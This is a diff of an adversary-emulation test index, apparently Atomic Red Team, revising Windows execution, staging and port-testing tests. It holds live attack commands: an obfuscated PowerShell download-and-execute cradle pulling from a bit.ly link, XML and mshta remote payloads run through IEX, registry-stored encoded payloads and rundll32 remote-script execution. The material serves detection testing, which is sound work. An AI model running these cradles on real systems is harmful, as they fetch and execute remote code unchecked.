@@ -23105,9 +23201,10 @@ execution:
 
 '
     - name: BloodHound
-      description: "Upon execution BloodHound will be downloaded and executed. It
-        will set up collection methods, run,\n\nand then compress and store the data
-        to the temp directory on the machine \n"
+      description: |
+        Upon execution BloodHound will be downloaded and executed. It will set up collection methods, run,
+
+        and then compress and store the data to the temp directory on the machine
       supported_platforms:
       - windows
       input_arguments:
@@ -23139,7 +23236,9 @@ execution:
           (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
           Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
     - name: Mimikatz - Cradlecraft PsSendKeys
-      description: 'Run mimikatz via PsSendKeys
+      description: 'Run mimikatz via PsSendKeys. Upon execution, automated actions
+        will take place to open file explorer, open notepad and input code, then mimikatz
+        dump info will be displayed.
 
 '
       supported_platforms:
@@ -23174,36 +23273,6 @@ execution:
           Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"
 
 '
-    - name: PowerShell Add User
-      description: 'Using PS 5.1, add a user via CLI
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_name:
-          description: username to add
-          type: string
-          default: atomic_user
-        full_name:
-          description: Full name of user
-          type: string
-          default: Atomic Red Team
-        password:
-          description: password to use
-          type: string
-          default: ATOM1CR3DT3@M
-        description:
-          description: Brief description of account
-          type: string
-          default: Atomic Things
-      executor:
-        name: powershell
-        elevation_required: true
-        command: 'New-LocalUser -FullName ''#{full_name}'' -Name ''#{user_name}''
-          -Password #{password} -Description ''#{description}''
-
-'
     - name: Powershell MsXml COM object - no prompt
       description: |
         Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -23226,9 +23295,9 @@ execution:
 '
     - name: Powershell MsXml COM object - with prompt
       description: |
-        Provided by https://github.com/mgreen27/mgreen27.github.io
-        Powershell MsXml COM object.
-        Not proxy aware removing cache although does not appear to write to those locations
+        Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.
+
+        Provided by https://github.com/mgreen27/mgreen27.github.i
       supported_platforms:
       - windows
       input_arguments:
@@ -23246,8 +23315,9 @@ execution:
 '
     - name: Powershell XML requests
       description: |
+        Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.
+
         Provided by https://github.com/mgreen27/mgreen27.github.io
-        Powershell xml download request
       supported_platforms:
       - windows
       input_arguments:
@@ -23259,14 +23329,15 @@ execution:
         name: command_prompt
         elevation_required: false
         command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec
-          bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''#{url}'');$Xml.command.a.execute
+          bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''#{url}'');$Xml.command.a.execute
           | IEX"
 
 '
     - name: Powershell invoke mshta.exe download
       description: |
+        Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".
+
         Provided by https://github.com/mgreen27/mgreen27.github.io
-        Powershell invoke mshta to download payload
       supported_platforms:
       - windows
       input_arguments:
@@ -23275,9 +23346,9 @@ execution:
           type: url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct
       executor:
-        name: powershell
+        name: command_prompt
         elevation_required: false
-        command: '"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"
+        command: 'C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"
 
 '
     - name: Powershell Invoke-DownloadCradle
@@ -23292,15 +23363,14 @@ execution:
           1. Open Powershell_ise as a Privileged Account
           2. Invoke-DownloadCradle.ps1
     - name: PowerShell Fileless Script Execution
-      description: 'Execution of a PowerShell payload from the Windows Registry similar
-        to that seen in fileless malware infections.
-
-'
+      description: |
+        Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
+        art-marker.txt is in the folder.
       supported_platforms:
       - windows
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
           # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
@@ -23328,7 +23398,7 @@ execution:
 '
     - name: NTFS Alternate Data Stream Access
       description: 'Creates a file with an alternate data stream and simulates executing
-        that hidden code/file
+        that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.
 
 '
       supported_platforms:
@@ -23682,7 +23752,8 @@ execution:
       identifier: T1085
     atomic_tests:
     - name: Rundll32 execute JavaScript Remote Payload With GetObject
-      description: 'Test execution of a remote script using rundll32.exe
+      description: 'Test execution of a remote script using rundll32.exe. Upon execution
+        notepad.exe will be opened.
 
 '
       supported_platforms:
@@ -23744,6 +23815,7 @@ execution:
     - name: Rundll32 ieadvpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with ieadvpack.dll.
+        Upon execution calc.exe will be launched
 
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
       supported_platforms:
@@ -23768,7 +23840,7 @@ execution:
 '
     - name: Rundll32 syssetup.dll Execution
       description: |
-        Test execution of a command using rundll32.exe with syssetup.dll.
+        Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened
 
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
       supported_platforms:
@@ -23794,7 +23866,7 @@ execution:
 '
     - name: Rundll32 setupapi.dll Execution
       description: |
-        Test execution of a command using rundll32.exe with setupapi.dll.
+        Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
 
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
       supported_platforms:
@@ -24084,7 +24156,8 @@ execution:
           chmod +x /tmp/art.sh
           sh /tmp/art.sh
     - name: Create and Execute Batch Script
-      description: 'Creates and executes a simple batch script.
+      description: 'Creates and executes a simple batch script. Upon execution, CMD
+        will briefly launh to run the batch script then close again.
 
 '
       supported_platforms:
@@ -24094,17 +24167,24 @@ execution:
           description: Command to execute within script.
           type: string
           default: dir
-        script_to_create:
+        script_path:
           description: Path of script to create.
           type: path
-          default: C:\Windows\TEMP\execute.bat
+          default: "$env:TEMP\\T1064_script.bat"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Batch file must exist on disk at specified location (#{script_path})
+        prereq_command: 'if (Test-Path #{script_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item #{script_path} -Force | Out-Null
+          Set-Content -Path #{script_path} -Value "#{command_to_execute}"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute}
-          > #{script_to_create}\nC:\\Windows\\system32\\cmd.exe /Q /c #{script_to_create}
-          \n"
-        cleanup_command: 'del #{script_to_create} >nul 2>&1
+        command: 'Start-Process #{script_path}
+
+'
+        cleanup_command: 'Remove-Item #{script_path} -Force -ErrorAction Ignore
 
 '
   T1035:
@@ -27299,17 +27379,24 @@ collection:
       identifier: T1074
     atomic_tests:
     - name: Stage data from Discovery.bat
-      description: 'Utilize powershell to download discovery.bat and save to a local
-        file
-
-'
+      description: |
+        Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
+        verify that the file is saved in the temp directory.
       supported_platforms:
       - windows
+      input_arguments:
+        output_file:
+          description: Location to save downloaded discovery.bat file
+          type: Path
+          default: "$env:TEMP\\discovery.bat"
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
-          > pi.log
+        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat"
+          -OutFile #{output_file}
+
+'
+        cleanup_command: 'Remove-Item -Force #{output_file} -ErrorAction Ignore
 
 '
     - name: Stage data from Discovery.sh
@@ -27327,21 +27414,28 @@ collection:
 
 '
     - name: Zip a Folder with PowerShell for Staging in Temp
-      description: 'Use living off the land tools to zip a file and stage it in the
-        Windows temporary folder for later exfiltration.
-
-'
+      description: |
+        Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
+        was placed in the temp directory.
       supported_platforms:
       - windows
+      input_arguments:
+        input_file:
+          description: Location of file or folder to zip
+          type: Path
+          default: PathToAtomicsFolder\T1074\bin\Folder_to_zip
+        output_file:
+          description: Location to save zipped file or folder
+          type: Path
+          default: "$env:TEMP\\Folder_to_zip.zip"
       executor:
         name: powershell
         elevation_required: false
-        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
-          -DestinationPath $env:TEMP\Folder_to_zip.zip
+        command: 'Compress-Archive -Path #{input_file} -DestinationPath #{output_file}
+          -Force
 
 '
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction
-          Ignore
+        cleanup_command: 'Remove-Item -Path #{output_file} -ErrorAction Ignore
 
 '
   '':
@@ -29582,9 +29676,9 @@ command-and-control:
       identifier: T1065
     atomic_tests:
     - name: Testing usage of uncommonly used port with PowerShell
-      description: 'Testing uncommonly used port utilizing PowerShell
-
-'
+      description: |
+        Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon exectuion, details about the successful
+        port check will be displayed.
       supported_platforms:
       - windows
       input_arguments:
@@ -29599,7 +29693,7 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: 'test-netconnection -ComputerName #{domain} -port #{port}
+        command: 'Test-NetConnection -ComputerName #{domain} -port #{port}
 
 '
     - name: Testing usage of uncommonly used port
